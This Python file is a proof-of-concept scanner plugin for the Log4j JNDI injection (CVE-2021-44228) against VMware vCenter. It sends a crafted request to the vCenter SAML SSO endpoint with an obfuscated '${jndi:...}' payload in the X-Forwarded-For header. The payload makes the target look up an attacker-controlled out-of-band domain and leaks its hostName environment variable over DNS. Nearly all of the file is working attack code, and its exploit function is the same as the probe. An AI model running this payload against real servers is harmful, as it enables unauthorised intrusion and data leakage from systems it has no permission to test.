import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''VMware VCenter Log4j JNDI RCE''',
        "description": '''A critical vulnerability in Apache Log4j identified by CVE-2021-44228 has been publicly disclosed that may allow for remote code execution in impacted VMware VCenter.''',
        "severity": "high",
        "references": [
            "https://www.vmware.com/security/advisories/VMSA-2021-0028.html", 
            "https://github.com/advisories/GHSA-jfh8-c2jp-5v3q", 
            "https://twitter.com/tnpitsecurity/status/1469429810216771589"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["rce", "jndi", "log4j", "vcenter", "vmware"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/websso/SAML2/SSO/vsphere.local?SAMLRequest="""
        method = "GET"
        data = """"""
        headers = {'X-Forwarded-For': '${jndi:${lower:d}n${lower:s}://${env:hostName}.%s}' % oob_domain}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url